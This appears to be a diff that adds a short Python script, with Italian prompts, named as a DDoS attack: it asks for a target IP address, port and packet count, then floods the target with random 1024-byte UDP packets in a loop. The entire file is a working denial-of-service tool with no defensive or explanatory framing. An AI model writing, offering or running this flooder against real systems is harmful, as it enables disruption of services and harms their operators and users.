@@ -1,0 +1,15 @@
+import random, socket
+
+def ddos_attack():
+	IP = str(input("Inserisci l'indirizzo IP: "))
+	PORT = int(input('Inserisci la porta: '))
+	pacchetti = int(input('Inserisci il numero di pacchetti da inviare: '))
+	dati_inviati = random._urandom(1024)
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	target = (str(IP), int(PORT))
+	for x in range (pacchetti):
+		sock.sendto(dati_inviati, target)
+		print ('#' , x,'- UDP inviato\n')
+		
+
+print (ddos_attack())
